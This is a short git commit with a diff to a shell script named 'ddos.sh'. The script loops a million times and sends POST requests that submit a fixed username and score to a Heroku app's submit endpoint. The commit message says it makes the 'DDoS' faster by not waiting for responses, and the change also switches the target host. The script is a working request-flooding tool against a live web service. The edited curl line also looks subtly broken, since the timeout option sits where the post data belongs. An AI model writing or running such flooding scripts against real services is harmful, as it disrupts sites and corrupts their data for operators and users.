f3cc31fcdaca9ed842a88202ca6b9647fecc37b2
Josh Simani <jsimani@gmail.com>
2018-12-06 22:50:57 -0500

    Made DDoS faster by not waiting for response

--- security/ddos.sh
+++ security/ddos.sh
@@ -5,7 +5,7 @@ counter=1
 while [ $counter -le 1000000 ]
 do
 echo $counter
-curl -d "username=Josh&score=12346&grid={}" https://secret-oasis-38538.herokuapp.com/submit > /dev/null 2> /dev/null
+curl -d --max-time 0.1 "username=Josh&score=12346&grid={}" https://cryptic-brook-57226.herokuapp.com/submit > /dev/null 2> /dev/null
 ((counter++))
 done
 echo All done
